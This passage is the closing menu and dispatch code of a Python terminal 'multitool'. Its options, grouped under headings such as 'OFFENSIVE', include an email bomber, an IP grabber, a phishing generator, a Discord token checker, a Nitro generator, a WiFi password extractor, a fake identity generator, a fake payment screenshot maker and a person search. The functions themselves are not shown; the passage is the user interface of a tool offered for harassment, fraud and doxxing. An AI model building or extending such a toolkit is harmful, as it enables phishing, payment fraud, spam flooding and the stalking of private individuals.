        print(f"{W}  │{RST} {W}{B}OSINT / RECON{RST}")
        print(f"{W}  │{RST}   {C} 9){RST} {W}Phone Lookup{RST}")
        print(f"{W}  │{RST}   {C}10){RST} {W}Email Breach Lookup{RST}")
        print(f"{W}  │{RST}   {C}11){RST} {W}Website Scanner{RST}")
        print(f"{W}  │{RST}   {C}12){RST} {W}Username OSINT{RST}")
        print(f"{W}  │{RST}   {C}13){RST} {W}IP / Domain Lookup{RST}")
        print(f"{W}  ├─────────────────────────────────────────────────┤{RST}")
        # UTILITIES
        print(f"{W}  │{RST} {W}{B}UTILITIES{RST}")
        print(f"{W}  │{RST}   {C}14){RST} {W}IP Generator{RST}")
        print(f"{W}  │{RST}   {C}15){RST} {W}Fake Identity Generator{RST}")
        print(f"{W}  │{RST}   {C}16){RST} {W}Password & Username Tools{RST}")
        print(f"{W}  │{RST}   {C}17){RST} {W}WiFi Password Extractor{RST}")
        print(f"{W}  │{RST}   {C}18){RST} {W}File Hash Generator{RST}")
        print(f"{W}  │{RST}   {C}19){RST} {W}QR Code Generator{RST}")
        print(f"{W}  │{RST}   {C}20){RST} {W}Text Toolkit (b64/hex/morse/…){RST}")
        print(f"{W}  │{RST}   {C}21){RST} {W}Proxy Checker{RST}")
        print(f"{W}  │{RST}   {C}22){RST} {W}Reverse Image Search{RST}")
        print(f"{W}  │{RST}   {C}23){RST} {W}Fake Payment Screenshot{RST}")
        print(f"{W}  │{RST}   {C}24){RST} {W}Quick Launcher (websites){RST}")
        print(f"{W}  │{RST}   {C}25){RST} {W}ASCII Art Generator{RST}")
        print(f"{W}  │{RST}   {C}26){RST} {W}YouTube Video Info{RST}")
        print(f"{W}  │{RST}   {C}27){RST} {W}German Address Generator{RST}")
        print(f"{W}  │{RST}   {C}28){RST} {W}Complete Person Search{RST}")
        print(f"{W}  │{RST}   {C}29){RST} {W}Crypto Wallet Generator{RST}")
        print(f"{W}  ├─────────────────────────────────────────────────┤{RST}")
        print(f"{W}  │{RST}   {C} 0){RST} {W}Exit  {DIM}(oder ESC){RST}")
        print(f"{W}  └─────────────────────────────────────────────────┘{RST}")
        print(f"\n{Y}{B}  > {RST}", end="", flush=True)
        c = menu_choice().strip()
        actions = {
            # DISCORD
            "1":join_discord, "2":discord_username_sniper, "3":invite_info,
            "4":nitro_gen, "5":token_checker,
            # OFFENSIVE
            "6":email_bomber, "7":ip_grabber, "8":phishing_generator,
            # OSINT
            "9":phone_lookup, "10":email_lookup, "11":website_scanner,
            "12":username_osint, "13":ip_lookup,
            # UTILITIES
            "14":ip_generator, "15":fake_identity, "16":password_tools,
            "17":wifi_extractor, "18":file_hasher,
            "19":qr_generator, "20":text_toolkit, "21":proxy_checker,
            "22":reverse_image_search, "23":fake_payment, "24":quick_launcher,
            "25":ascii_art, "26":youtube_info, "27":german_address,
            "28":person_search, "29":crypto_wallets,
        }
        if c == "0": print(f"\n{M}bye bae 💛{RST}\n"); sys.exit(0)
        if c in actions:
            try: actions[c]()
            except BackToMenu: continue
            except KeyboardInterrupt: continue

if __name__ == "__main__":
    try:
        startup_animation()
        menu()
    except KeyboardInterrupt: print(f"\n{M}bye bae 💛{RST}\n")
